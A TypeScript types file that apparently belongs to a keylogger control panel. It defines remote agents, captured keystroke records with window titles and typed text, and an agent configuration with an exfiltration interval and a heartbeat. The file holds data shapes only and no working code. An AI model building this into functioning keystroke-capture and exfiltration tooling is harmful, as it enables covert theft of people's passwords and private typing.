/* ── Shared types extracted from components ── */

export type AgentStatus = "active" | "idle" | "offline";

export interface Agent {
  id: string;
  hostname: string;
  ip: string;
  os: string;
  version: string;
  keystrokeCount: number;
  status: AgentStatus;
  lastSeen: string;
  activityHistory: number[];
  username?: string;
  firstSeen?: string;
}

export interface KeystrokeEntry {
  id: string;
  agentId: string;
  agentHostname: string;
  timestamp: string;
  windowTitle: string;
  process: string;
  text: string;
}

/* ── API response shapes (snake_case from backend) ── */

export interface ApiAgent {
  id: string;
  hostname: string;
  ip: string;
  os: string;
  version?: string;
  keystroke_count: number;
  status: AgentStatus;
  last_seen_utc: string;
  first_seen_utc?: string;
  username?: string;
  activity_history: number[];
}

export interface ApiAgentsResponse {
  agents: ApiAgent[];
  latest_version: string | null;
}

export interface ApiKeystroke {
  id: string;
  agent_id: string;
  agent_hostname: string;
  timestamp_utc: string;
  window_title: string;
  process_name: string;
  key_char: string;
}

export interface HourlyActivity {
  hour: string;
  keystrokes: number;
}

export interface AgentConfig {
  exfilIntervalSeconds: number;
  heartbeatIntervalSeconds: number;
  blacklist: string[];
  enabled: boolean;
}
